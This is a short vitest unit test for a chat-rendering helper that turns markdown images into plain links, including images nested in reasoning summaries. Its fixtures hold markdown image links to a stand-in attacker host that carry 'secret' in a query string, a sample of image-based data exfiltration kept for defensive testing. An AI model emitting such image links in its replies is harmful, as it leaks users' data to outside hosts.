import { describe, expect, it } from 'vitest';
import type { ChatMessage } from '@/lib/chat/turn';
import { withoutImages } from './conversation-sheet';

describe('withoutImages', () => {
  it('turns every markdown image into a link, in replies and nested blocks alike', () => {
    const messages = [
      { type: 'ai', content: 'See ![chart](https://evil.example/p?d=secret "t").' },
      {
        type: 'ai',
        content: [
          { type: 'reasoning', summary: [{ type: 'summary_text', text: '![x](https://evil.example/a)' }] },
          { type: 'text', text: 'A [link](https://ok.example) stays.' },
        ],
      },
    ] as unknown as ChatMessage[];

    expect(JSON.stringify(withoutImages(messages))).not.toContain('![');
    expect(withoutImages(messages)[0].content).toBe('See [chart](https://evil.example/p?d=secret).');
    expect(JSON.stringify(withoutImages(messages)[1])).toContain('A [link](https://ok.example) stays.');
  });
});
